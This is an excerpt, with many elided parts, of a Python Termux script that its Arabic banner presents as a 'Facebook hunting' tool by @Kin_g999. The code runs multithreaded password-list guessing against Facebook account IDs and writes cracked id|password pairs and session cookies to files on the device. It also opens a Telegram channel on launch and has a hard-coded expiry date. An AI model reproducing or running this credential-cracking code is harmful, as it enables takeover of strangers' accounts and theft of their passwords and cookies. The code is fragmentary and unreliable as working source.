...
os.system('xdg-open https://t.me/termuxao')
import requests
...
def compare_phone_time():
    try:
        ...
        if phone_datetime.date() == world_datetime.date() and phone_datetime.time().replace(second=0, microsecond=0) == world_datetime.time().replace(second=0, microsecond=0):
            ...
            print(" ﺯﺎﻬﺠﻟﺍ ﺦﻳﺭﺎﺗ ﻊﺟﺮﻣ ﺶﻴﻟ")
            sys.exit()
    except Exception as e:
        print(f"✅ {e}")
compare_phone_time()
import datetime;now = datetime.date.today();target = datetime.date(2024,4,23)
if now >=target:exit("")
else:print("")
def a(z):
        for e in z:
...
⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀          
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31SRGON\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mDEVELOPER  : الملك سرجون
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mMY CHANNEL : @TERMUXAO
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTOOL       : صيد فيسبوك
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mTELEGRAM   : @Kin_g999
  \x1b[38;5;210m╰─ \033[1;33m[⌯]  \033[2;32mVERSON     : v1
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31SRGON\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                plist = []
                                print('\x1b[1;91m [01] \x1b[1;92mباسوردات قويه وخفيفه 🔥 \n\x1b[1;91m [02] \x1b[1;93mاضافه باسوردات 🔥 \n\x1b[1;91m [03] \x1b[1;94mباسوردات هواي 🔥 \n\x1b[1;91m [04] \x1b[1;95mباسوردات فول 🔥 ');linex()
                                ppp=input(' Choose: ')
                                if ppp in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;34m الصبر مفتاح الفرج ✅")
                                        print("\033[1;34m انتظر الان يتم فحص الحسابات ✅")
                                        linex()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32m@Kin_g999\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@Kin_g999-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@Kin_g999-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@Kin_g999-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@Kin_g999-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Kin_g999-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@Kin_g999] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@Kin_g999-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Kin_g999-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@Kin_g999-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@Kin_g999-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@Kin_g999-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@Kin_g999-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@Kin_g999-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
